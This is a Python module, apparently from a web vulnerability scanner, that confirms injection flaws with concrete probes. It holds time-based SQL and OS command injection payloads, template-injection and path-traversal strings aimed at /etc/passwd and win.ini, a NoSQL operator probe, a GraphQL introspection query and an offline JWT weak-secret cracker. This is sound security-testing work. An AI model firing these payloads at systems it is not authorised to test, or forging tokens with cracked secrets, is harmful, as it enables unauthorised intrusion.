"""Phase 2 — deterministic injection verifiers.

These prove the harder classes with hard signals, not AI opinion:
  * time-based blind SQLi / command injection -> measured delay, double-checked
  * SSTI                                       -> computed arithmetic reflected
  * LFI / path traversal                       -> /etc/passwd or win.ini signature
  * NoSQL injection                            -> DB error signature
  * GraphQL introspection                      -> __schema in response
  * JWT weakness                               -> secret cracked locally (HMAC)

AI-crafted payload mutation lives in ai_tester.py and only ever yields
needs-review unless a response still trips one of these deterministic signals.
"""
import re
import hmac
import json
import time
import base64
import hashlib
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

# ---- shared helpers (mirror verifiers.py) --------------------------------
def _params(url):
    p = urlparse(url)
    return p, parse_qs(p.query, keep_blank_values=True)


def _set_param(url, key, value):
    p, q = _params(url)
    q = {k: v[:] for k, v in q.items()}
    q[key] = [value]
    flat = urlencode([(k, vv) for k, vals in q.items() for vv in vals])
    return urlunparse(p._replace(query=flat))


def _f(title, vclass, sev, cvss, conf, desc, steps, req, resp):
    return dict(title=title, vuln_class=vclass, severity=sev, cvss=cvss,
                confidence=conf, description=desc, steps=steps,
                poc_request=req, poc_response=resp)


# ---- timing primitive (used by SQLi + command injection) -----------------
def _timed(send, url):
    r = send("GET", url)
    return (r.get("elapsed") if r.get("ok") else None), r


def _confirm_delay(send, make_url, delay_short=2, delay_long=5):
    """A delay is real only if the long payload is ~long and the short ~short.
    Returns (confirmed, evidence, long_url, long_result)."""
    base_e, _ = _timed(send, make_url(0))
    if base_e is None:
        return False, "", None, None
    long_e, long_r = _timed(send, make_url(delay_long))
    if long_e is None or (long_e - base_e) < delay_long - 1.5:
        return False, "", None, None
    short_e, _ = _timed(send, make_url(delay_short))
    if short_e is None:
        return False, "", None, None
    # long clearly slower than short, short clearly slower than baseline
    if (long_e - short_e) >= 1.5 and (short_e - base_e) >= delay_short - 1.5:
        ev = f"baseline={base_e:.1f}s, sleep({delay_short})={short_e:.1f}s, sleep({delay_long})={long_e:.1f}s"
        return True, ev, make_url(delay_long), long_r
    return False, "", None, None


SQLI_TIME = [
    "{v}' AND SLEEP({n})-- -", "{v}\" AND SLEEP({n})-- -", "{v} AND SLEEP({n})",
    "{v}') AND SLEEP({n})-- -", "{v}';WAITFOR DELAY '0:0:{n}'-- -",
    "{v} AND pg_sleep({n})",
]


def check_time_sqli(send, url):
    _, q = _params(url)
    out = []
    for key in q:
        base = (q[key][0] if q[key] else "1")
        for tmpl in SQLI_TIME:
            mk = lambda n, t=tmpl, k=key: _set_param(url, k, t.format(v=base, n=n))
            ok, ev, lu, lr = _confirm_delay(send, mk)
            if ok:
                out.append(_f(
                    f"Blind (time-based) SQL injection via '{key}'", "hunt-sqli",
                    "critical", "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "confirmed",
                    f"Parameter '{key}' is injectable: a time-delay payload reproducibly delays the response ({ev}).",
                    f"GET {lu} delays ~5s; a sleep(2) variant delays ~2s; baseline is fast.",
                    f"GET {lu}", f"timing: {ev}"))
                break
    return out


CMDI_TIME = ["{v};sleep {n}", "{v}|sleep {n}", "{v}$(sleep {n})", "{v}`sleep {n}`",
             "{v}&& sleep {n}", "{v}%0asleep {n}"]


def check_cmd_injection(send, url):
    _, q = _params(url)
    out = []
    for key in q:
        base = (q[key][0] if q[key] else "x")
        for tmpl in CMDI_TIME:
            mk = lambda n, t=tmpl, k=key: _set_param(url, k, t.format(v=base, n=n))
            ok, ev, lu, lr = _confirm_delay(send, mk)
            if ok:
                out.append(_f(
                    f"OS command injection via '{key}'", "hunt-rce",
                    "critical", "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "confirmed",
                    f"Parameter '{key}' executes shell commands: a sleep payload reproducibly delays the response ({ev}).",
                    f"GET {lu} delays by the injected sleep.",
                    f"GET {lu}", f"timing: {ev}"))
                break
    return out


# ---- SSTI (computed arithmetic) ------------------------------------------
SSTI_TMPL = ["{{{{{a}*{b}}}}}", "${{{a}*{b}}}", "#{{{a}*{b}}}", "<%= {a}*{b} %>",
             "{{{{{a}.__class__}}}}"]


def check_ssti(send, url):
    _, q = _params(url)
    out = []
    a, b = 73, 79          # product 5767 — unlikely to occur by chance
    prod = str(a * b)
    for key in q:
        for tmpl in SSTI_TMPL[:4]:
            payload = "vss" + tmpl.format(a=a, b=b)
            r = send("GET", _set_param(url, key, payload))
            if r.get("ok") and ("vss" + prod) in (r.get("text") or ""):
                tu = _set_param(url, key, payload)
                out.append(_f(
                    f"Server-Side Template Injection via '{key}'", "hunt-ssti",
                    "critical", "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "confirmed",
                    f"Parameter '{key}' evaluates template expressions: injected '{a}*{b}' rendered as '{prod}'.",
                    f"GET {tu}; response contains vss{prod}.",
                    f"GET {tu}", (r.get("text") or "")[:800]))
                break
    return out


# ---- LFI / path traversal -------------------------------------------------
LFI_PAYLOADS = ["../../../../../../../../etc/passwd", "....//....//....//....//etc/passwd",
                "/etc/passwd", "..\\..\\..\\..\\..\\windows\\win.ini",
                "....\\\\....\\\\windows\\win.ini"]
PASSWD_RE = re.compile(r"root:.*:0:0:", re.M)


def check_lfi(send, url):
    _, q = _params(url)
    out = []
    for key in q:
        for p in LFI_PAYLOADS:
            r = send("GET", _set_param(url, key, p))
            if not r.get("ok"):
                continue
            body = r.get("text") or ""
            sig = "/etc/passwd" if PASSWD_RE.search(body) else ("win.ini" if "[extensions]" in body.lower() else None)
            if sig:
                tu = _set_param(url, key, p)
                out.append(_f(
                    f"Local File Inclusion / path traversal via '{key}'", "hunt-lfi",
                    "high", "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", "confirmed",
                    f"Parameter '{key}' reads arbitrary files: payload returned {sig} contents.",
                    f"GET {tu}; response contains system file contents.",
                    f"GET {tu}", body[:800]))
                break
    return out


# ---- NoSQL injection (error signature) -----------------------------------
NOSQL_ERRORS = ["mongoerror", "bson", "$where", "unterminated string", "couchdb",
                "unexpected token", "e11000", "cast to objectid failed"]


def check_nosqli(send, url):
    _, q = _params(url)
    out = []
    for key in q:
        r = send("GET", _set_param(url, key, '"\';{$gt:""}//'))
        if not r.get("ok"):
            continue
        low = (r.get("text") or "").lower()
        hit = next((s for s in NOSQL_ERRORS if s in low), None)
        if hit:
            tu = _set_param(url, key, '"\';{$gt:""}//')
            out.append(_f(
                f"NoSQL injection via '{key}'", "hunt-nosqli", "high",
                "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N", "confirmed",
                f"Parameter '{key}' triggers a NoSQL engine error ({hit!r}), indicating operator injection.",
                f"GET {tu}; response contains a NoSQL error.",
                f"GET {tu}", (r.get("text") or "")[:800]))
    return out


# ---- GraphQL introspection -----------------------------------------------
def check_graphql(send, base_url, endpoints):
    out = []
    cands = [u for u in endpoints if "graphql" in u.lower()] or [base_url.rstrip("/") + "/graphql"]
    query = '{"query":"{__schema{types{name}}}"}'
    for u in cands[:3]:
        r = send("POST", u, headers="Content-Type: application/json", body=query)
        if r.get("ok") and "__schema" in (r.get("text") or "") or (r.get("ok") and '"types"' in (r.get("text") or "")):
            out.append(_f(
                "GraphQL introspection enabled", "hunt-graphql", "medium",
                "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N", "confirmed",
                f"{u} answers introspection queries, exposing the full schema.",
                f"POST {u} with an introspection query returns __schema.",
                f"POST {u}\\n{query}", (r.get("text") or "")[:800]))
    return out


# ---- JWT weakness (local HMAC crack — no network) ------------------------
JWT_RE = re.compile(r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+")
WEAK_SECRETS = ["secret", "password", "123456", "jwt", "changeme", "admin",
                "your-256-bit-secret", "key", "test", "qwerty", "s3cr3t",
                "supersecret", "private", "token", "HS256", "secretkey"]


def _b64url(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def check_jwt(tokens):
    """tokens: list of candidate JWT strings. Pure local compute."""
    out = []
    for tok in tokens:
        m = JWT_RE.search(tok or "")
        if not m:
            continue
        jwt = m.group(0)
        try:
            h_b64, p_b64, sig_b64 = jwt.split(".")
            header = json.loads(base64.urlsafe_b64decode(h_b64 + "=="))
        except Exception:
            continue
        alg = (header.get("alg") or "").upper()
        if alg != "HS256":
            continue
        signing_input = f"{h_b64}.{p_b64}".encode()
        for sec in WEAK_SECRETS:
            calc = _b64url(hmac.new(sec.encode(), signing_input, hashlib.sha256).digest())
            if hmac.compare_digest(calc, sig_b64):
                out.append(_f(
                    f"JWT signed with a weak secret: {sec!r}", "hunt-jwt-crypto",
                    "critical", "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N", "confirmed",
                    f"The application's HS256 JWT verifies against the trivial secret {sec!r}, so tokens can be forged for any user/role.",
                    "Crack the HS256 signature offline against a wordlist; re-sign a modified payload.",
                    f"token: {jwt[:60]}...", f"secret = {sec!r} (HMAC-SHA256 verified)"))
                break
    return out
